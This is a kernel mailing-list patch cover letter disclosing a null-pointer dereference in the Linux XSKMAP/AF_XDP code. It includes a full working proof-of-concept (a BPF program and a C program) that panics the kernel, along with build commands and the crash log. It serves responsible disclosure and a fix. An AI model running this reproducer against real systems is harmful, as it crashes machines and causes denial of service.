Return-Path: <netdev+bounces-272982-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id 6AZyIUV+yWnbyQUAu9opvQ
	(envelope-from <netdev+bounces-272982-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Sun, 29 Mar 2026 21:32:21 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 3030E353CBF
	for <lists+netdev@lfdr.de>; Sun, 29 Mar 2026 21:32:21 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 5454630221E0
	for <lists+netdev@lfdr.de>; Sun, 29 Mar 2026 19:29:53 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id D6119386561;
	Sun, 29 Mar 2026 19:29:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="TJqmNpjN"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pg1-f169.google.com (mail-pg1-f169.google.com [209.85.215.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 462571E505
	for <netdev@vger.kernel.org>; Sun, 29 Mar 2026 19:29:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774812592; cv=none; b=TY+SUf3ITR8Q7eyEgJqYXnlvGwYLqvSL4fKgBmVEHuqtXwbu9S77nhfrKGy75BRLlqCTKLvpj6sGMmYlMDtC+sFeMn57Itpr3FN4w4+yGrArEIoo1HM9SLDS8Et1+36QWXWvjkks/uFzmZz/8RhxRk8KvLfep9k/X5I15bLhdp4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774812592; c=relaxed/simple;
	bh=WqqgqakgBrc2doZR2S5dZPmTOt6VmpJ8fJkSO6RqXmU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=FxSYoIfcT/7BiaYu3SK+/U6IsfTliJ9ElBsVqgIrHwzj7vMWziakjV+2BNLh0wOhYRj5kUumVKjbzqLYdl/tVTKCMnNuxH1YvHw5cG3WDpUIRnSP1hzeVnyjDk4Zs2MOHoaNTZ+pjgj48zfVcRwTpdddo4XVWpnh8OHht974z5I=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=TJqmNpjN; arc=none smtp.client-ip=209.85.215.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pg1-f169.google.com with SMTP id 41be03b00d2f7-c70f91776fcso1494493a12.0
        for <netdev@vger.kernel.org>; Sun, 29 Mar 2026 12:29:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1774812590; x=1775417390; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=9YegG4K4epc48M1SSnzeyN297wZvqOvGRiGaqRuTncI=;
        b=TJqmNpjN175jfGKSHfoThbswzHA/s7bUj56dcJyPKqrHRVCDkYF8jLuFLj9i31axSb
         1MbZe83cQ+cW7800Z/j43SPyL/DMN3GcCuVx9Iyq/84DJKHgXtsd1Ff1U3vfWjYWAn3w
         +acbLiCqe5KwHQ5kvFbmJhw79TlWPvJZB/+C0wxAuJooqRZGbasldfkzOo93NabfIAks
         kOHNDrK0xW4g9DeB3xIB9Ays3a7KmWb8cb4ochS7QLOMSQpGbJ8ReEl3LwhGNXmMZcpT
         0HJFOQ8xDaw5EwVHJaTVTJutYLB0R5LSNakHt1F1DLXUrgzuEgE1ILANjAdNcp6AejXd
         E7RA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774812590; x=1775417390;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=9YegG4K4epc48M1SSnzeyN297wZvqOvGRiGaqRuTncI=;
        b=UhpyKlH223j+8VI003x0B6N2HAGdGew/x+PAA3gOAek4QBoKQXvtJSMWUnbtMG4K93
         dn/RtA7Zz7ZUyG83V+9RTFWThpCHx9Z4h9ZEFR5rbZhRTt3MO6aCyBOKhvgUa5hJNCoT
         pKKAKbhOtB7HHXvJkzCS5F6VF/AlacyzAKYacwZx1d+wxlFcgFCaNiKvGWugp1OztfDu
         qECaS+C7nqgxqzhz/jfG8rJ4aLBMD2KAoldwMi5svfv05+yipj83M6n/EAuROTbd5crV
         7YTWHhSphe4PWWvroLmv8QDgDAC57wDzG16rKRwECOU4zr33hDqlN7ptvK9DeSCSr3+y
         vCig==
X-Forwarded-Encrypted: i=1; AJvYcCVo16p+C4poZRGVoKVE9c12lBWvDu9/S64jr+5O0FicaK72YL2oR48skFE8ex7VgjeEX8cpYaM=@vger.kernel.org
X-Gm-Message-State: AOJu0YyJ7ae5XuDxDbmQroraLf+IDEu7Q+jY+ZBrgJkEeCyBRzTTzFHx
	auTJ5FA47pnQJm8IUxftqWjd9mOtbF2HOCIrigHwcvUJF3BYWsWtONZf
X-Gm-Gg: ATEYQzxnz9/7LyXqd+ql2wXmuX3ccXI2hM/kij+txpbr5Av0VIzbFtu0DLlR85kIwQc
	l/mZHZpQjUJGnZVpq1Wqe6aC1EDjvIoQrFO3OkdC9ptRolDx1U7dbheOUrmH3xG37gvhuN98Rmv
	fbSi2PRJHuEpkZg9m63NwpITWDfPrf2jwzcGiIjpDLMkggYZBMEOPr2d6oXu5R5Xo2ozPMzc5G3
	URrtANCxNKTjSPNLiUaiaqmXL1kHHFg94gMbZ/n51gkkQpnVApSrdiWMNz1UOulNvskuAuqR7of
	L5UX+NpX6BxxO5ycyayUHWRGfGzt/S5Nd9pt+WXy+m9GsOjyhBNgC2BTP8yUdBVVJv8KWRcSXKh
	QY6wSlH592HamWEMBng4hUiBons2OT4I8zeioF9UgKQpcfDjw4/Qr5kP5Id07ADc65xhLnuZw33
	5uhxIl0OYA6owfapn4t1C2p36WGrLRkaSCCy5P67Q9wU98eQ==
X-Received: by 2002:a17:902:e952:b0:2ae:46b9:c653 with SMTP id d9443c01a7336-2b0cdcdc359mr104600515ad.33.1774812589529;
        Sun, 29 Mar 2026 12:29:49 -0700 (PDT)
Received: from hyj0824TXAir.sustech.edu.cn ([2001:da8:201d:1103:b2f6:47fe:9572:b2af])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2b242642905sm68959585ad.17.2026.03.29.12.29.44
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 29 Mar 2026 12:29:49 -0700 (PDT)
From: Linpu Yu <linpu5433@gmail.com>
To: magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	bjorn@kernel.org,
	linux-kernel@vger.kernel.org,
	yuantan098@gmail.com,
	yifanwucs@gmail.com
Subject: [PATCH 0/1] xskmap: reject TX-only AF_XDP sockets
Date: Mon, 30 Mar 2026 03:29:41 +0800
Message-ID: <cover.1774701288.git.linpu5433@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Spamd-Result: default: False [0.84 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_CONTAINS_FROM(1.00)[];
	R_MISSING_CHARSET(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	MIME_TRACE(0.00)[0:+];
	RCPT_COUNT_TWELVE(0.00)[18];
	FREEMAIL_CC(0.00)[fomichev.me,davemloft.net,google.com,kernel.org,redhat.com,iogearbox.net,gmail.com,vger.kernel.org];
	RCVD_TLS_LAST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-272982-lists,netdev=lfdr.de];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	FREEMAIL_FROM(0.00)[gmail.com];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[linpu5433@gmail.com,netdev@vger.kernel.org];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	NEURAL_HAM(-0.00)[-1.000];
	TO_DN_NONE(0.00)[];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
X-Rspamd-Queue-Id: 3030E353CBF
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

Hi,

We found and validated a low severity security issue in
net/xdp/xskmap.c from v4.18-rc1 to v7.0-rc4. The bug can cause a
KASAN report and panic when an XDP program redirects a packet to an
XSKMAP entry backed by a TX-only AF_XDP socket. We have also
included a minimum reproducer which was tested on v7.0.0-rc4.

We will send a patch as a follow-up in this thread. We've tested
it, and it should not affect any other functionality.

---- details below ----

Bug details:
xsk_map_update_elem() accepts any PF_XDP socket and does not
require an Rx ring. A TX-only AF_XDP socket can therefore be
inserted into an XSKMAP.

When an XDP program redirects a packet through such an entry, the
packet always enters the Rx path. The generic receive path reaches
xsk_generic_rcv(), which assumes xs->rx is valid and dereferences
it. With a TX-only socket, xs->rx is NULL and the kernel reports a
KASAN null-ptr-deref before panicking.

The root cause is that XSKMAP publication validates only the socket
family, but redirect delivery requires an Rx-capable AF_XDP socket.

Required kernel config:
CONFIG_BPF
CONFIG_BPF_SYSCALL
CONFIG_XDP_SOCKETS
CONFIG_VETH

Reproducer:
    clang -O2 -g -target bpf -D__TARGET_ARCH_x86         -I/usr/include/x86_64-linux-gnu -c -o poc.bpf.o poc.bpf.c
    gcc -O2 -g -Wall -Wextra -o poc poc.c -lbpf -lelf -lz
    sudo ./poc ./poc.bpf.o

We have validated the PoC on v7.0.0-rc4 and v6.12.74.

---8<--- BEGIN poc.bpf.c ---8<---
// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
	__uint(type, BPF_MAP_TYPE_XSKMAP);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u32);
} xsks SEC(".maps");

SEC("xdp")
int redirect_to_xsk(struct xdp_md *ctx)
{
	return bpf_redirect_map(&xsks, 0, XDP_PASS);
}

char _license[] SEC("license") = "GPL";
---8<--- END poc.bpf.c ---8<---

---8<--- BEGIN poc.c ---8<---
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE

#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_link.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <unistd.h>

#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <bpf/xsk.h>

#define RX_IFACE "vethxdp0"
#define TX_IFACE "vethxdp1"
#define QUEUE_ID 0
#define NUM_DESCS 64
#define FRAME_SIZE XSK_UMEM__DEFAULT_FRAME_SIZE
#define NUM_FRAMES 16
#define UMEM_SIZE ((size_t)FRAME_SIZE * NUM_FRAMES)

static const unsigned char rx_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
static const unsigned char tx_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x02};

static int run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc)
		fprintf(stderr, "command failed (%d): %s\n", rc, cmd);
	return rc;
}

static int cleanup_links(void)
{
	return system("ip link del " RX_IFACE " >/dev/null 2>&1");
}

static int setup_links(void)
{
	int rc;

	cleanup_links();

	rc = run_cmd("ip link add " RX_IFACE " type veth peer name " TX_IFACE);
	if (rc)
		return -1;
	rc = run_cmd("ip link set dev " RX_IFACE " address 02:00:00:00:00:01");
	if (rc)
		return -1;
	rc = run_cmd("ip link set dev " TX_IFACE " address 02:00:00:00:00:02");
	if (rc)
		return -1;
	rc = run_cmd("ip link set dev " RX_IFACE " up");
	if (rc)
		return -1;
	rc = run_cmd("ip link set dev " TX_IFACE " up");
	if (rc)
		return -1;

	return 0;
}

static int send_test_frame(int ifindex)
{
	unsigned char frame[64];
	struct sockaddr_ll addr;
	struct ethhdr *eth = (struct ethhdr *)frame;
	int fd, ret;

	memset(frame, 0x41, sizeof(frame));
	memcpy(eth->h_dest, rx_mac, ETH_ALEN);
	memcpy(eth->h_source, tx_mac, ETH_ALEN);
	eth->h_proto = htons(ETH_P_IP);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if (fd < 0) {
		perror("socket(AF_PACKET)");
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_IP);
	addr.sll_ifindex = ifindex;
	addr.sll_halen = ETH_ALEN;
	memcpy(addr.sll_addr, rx_mac, ETH_ALEN);

	ret = sendto(fd, frame, sizeof(frame), 0,
		     (struct sockaddr *)&addr, sizeof(addr));
	if (ret < 0) {
		perror("sendto");
		close(fd);
		return -1;
	}

	close(fd);
	return 0;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args)
{
	if (level == LIBBPF_DEBUG)
		return 0;
	return vfprintf(stderr, fmt, args);
}

int main(int argc, char **argv)
{
	struct xsk_ring_prod fill = {}, tx = {};
	struct xsk_ring_cons comp = {};
	struct xsk_socket_config xsk_cfg = {
		.rx_size = NUM_DESCS,
		.tx_size = NUM_DESCS,
		.libbpf_flags = XSK_LIBBPF_FLAGS__INHIBIT_PROG_LOAD,
		.xdp_flags = XDP_FLAGS_SKB_MODE,
		.bind_flags = XDP_COPY,
	};
	struct rlimit rlim = {
		.rlim_cur = RLIM_INFINITY,
		.rlim_max = RLIM_INFINITY,
	};
	struct xsk_umem *umem = NULL;
	struct xsk_socket *xsk = NULL;
	struct bpf_program *prog;
	struct bpf_object *obj = NULL;
	struct bpf_map *xsks_map;
	const char *bpf_path;
	void *umem_area = NULL;
	int rx_ifindex = -1, tx_ifindex = -1;
	int err = 1;

	if (argc > 2) {
		fprintf(stderr, "usage: %s [./poc.bpf.o]\n", argv[0]);
		return 1;
	}

	bpf_path = argc == 2 ? argv[1] : "./poc.bpf.o";

	libbpf_set_print(libbpf_print_fn);
	setrlimit(RLIMIT_MEMLOCK, &rlim);

	if (setup_links()) {
		fprintf(stderr, "failed to create veth pair\n");
		goto out;
	}

	rx_ifindex = if_nametoindex(RX_IFACE);
	tx_ifindex = if_nametoindex(TX_IFACE);
	if (!rx_ifindex || !tx_ifindex) {
		fprintf(stderr, "if_nametoindex failed\n");
		goto out;
	}

	if (posix_memalign(&umem_area, getpagesize(), UMEM_SIZE)) {
		fprintf(stderr, "posix_memalign failed\n");
		goto out;
	}
	memset(umem_area, 0, UMEM_SIZE);

	err = xsk_umem__create(&umem, umem_area, UMEM_SIZE, &fill, &comp, NULL);
	if (err) {
		fprintf(stderr, "xsk_umem__create failed: %d\n", err);
		goto out;
	}

	err = xsk_socket__create(&xsk, RX_IFACE, QUEUE_ID, umem, NULL, &tx, &xsk_cfg);
	if (err) {
		fprintf(stderr, "xsk_socket__create failed: %d\n", err);
		goto out;
	}

	obj = bpf_object__open_file(bpf_path, NULL);
	if (libbpf_get_error(obj)) {
		err = (int)libbpf_get_error(obj);
		obj = NULL;
		fprintf(stderr, "bpf_object__open_file failed: %d\n", err);
		goto out;
	}

	err = bpf_object__load(obj);
	if (err) {
		fprintf(stderr, "bpf_object__load failed: %d\n", err);
		goto out;
	}

	prog = bpf_object__find_program_by_name(obj, "redirect_to_xsk");
	if (!prog) {
		fprintf(stderr, "failed to find program\n");
		goto out;
	}

	xsks_map = bpf_object__find_map_by_name(obj, "xsks");
	if (!xsks_map) {
		fprintf(stderr, "failed to find xsks map\n");
		goto out;
	}

	err = bpf_set_link_xdp_fd(rx_ifindex, bpf_program__fd(prog), XDP_FLAGS_SKB_MODE);
	if (err) {
		fprintf(stderr, "bpf_set_link_xdp_fd attach failed: %d\n", err);
		goto out;
	}

	err = xsk_socket__update_xskmap(xsk, bpf_map__fd(xsks_map));
	if (err) {
		fprintf(stderr, "xsk_socket__update_xskmap failed: %d\n", err);
		goto out;
	}

	fprintf(stderr, "sending one frame into %s queue %d\n", RX_IFACE, QUEUE_ID);
	fflush(stderr);

	if (send_test_frame(tx_ifindex))
		goto out;

	sleep(2);
	fprintf(stderr, "no crash observed\n");
	err = 0;

out:
	if (rx_ifindex > 0)
		bpf_set_link_xdp_fd(rx_ifindex, -1, XDP_FLAGS_SKB_MODE);
	if (xsk)
		xsk_socket__delete(xsk);
	if (umem)
		xsk_umem__delete(umem);
	free(umem_area);
	if (obj)
		bpf_object__close(obj);
	cleanup_links();
	return err;
}
---8<--- END poc.c ---8<---

Crash log:
[  628.881280][    C0] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000001: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  628.882528][    C0] KASAN: null-ptr-deref in range [0x0000000000000008-0x000000000000000f]
[  628.883234][    C0] CPU: 0 UID: 0 PID: 10251 Comm: poc Not tainted 6.12.74 #3
[  628.883828][    C0] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  628.884701][    C0] RIP: 0010:xsk_generic_rcv+0x1c1/0x460
[  628.885258][    C0] Code: 48 c1 ea 03 80 3c 02 00 0f 85 a0 02 00 00 48 8b 9d 80 05 00 00 48 b8 00 00 00 00 00 fc ff df 48 8d 7b 08 48 89 fa 48 c1 ea 03 <0f> b6 04 02 84 c0 74 09 3c 03 7f 05 e8 5e d6 ee f6 44 8b 73 08 48
[  628.886884][    C0] RSP: 0018:ffffc90000007738 EFLAGS: 00010212
[  628.887445][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88803fe40800
[  628.888062][    C0] RDX: 0000000000000001 RSI: ffffffff8b08bfc6 RDI: 0000000000000008
[  628.888699][    C0] RBP: ffff88803fe40800 R08: 0000000000000004 R09: 0000000000000000
[  628.889359][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: 00000000fffffff4
[  628.889985][    C0] R13: ffff88803fe40da8 R14: 0000000000000040 R15: ffffc90000007e98
[  628.890669][    C0] FS:  00007f7fe6b52740(0000) GS:ffff88806a800000(0000) knlGS:0000000000000000
[  628.891406][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  628.891949][    C0] CR2: 00007f7fe6c9f350 CR3: 0000000031de6000 CR4: 0000000000750ef0
[  628.892613][    C0] PKRU: 55555554
[  628.892925][    C0] Call Trace:
[  628.893226][    C0]  <IRQ>
[  628.945597][    C0] Modules linked in:
[  628.946047][    C0] ---[ end trace 0000000000000000 ]---
[  628.946512][    C0] RIP: 0010:xsk_generic_rcv+0x1c1/0x460
[  628.954560][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  628.955982][    C0] Kernel Offset: disabled

Best regards
Linpu Yu


Linpu Yu (1):
  xskmap: reject TX-only AF_XDP sockets

 net/xdp/xskmap.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.53.0


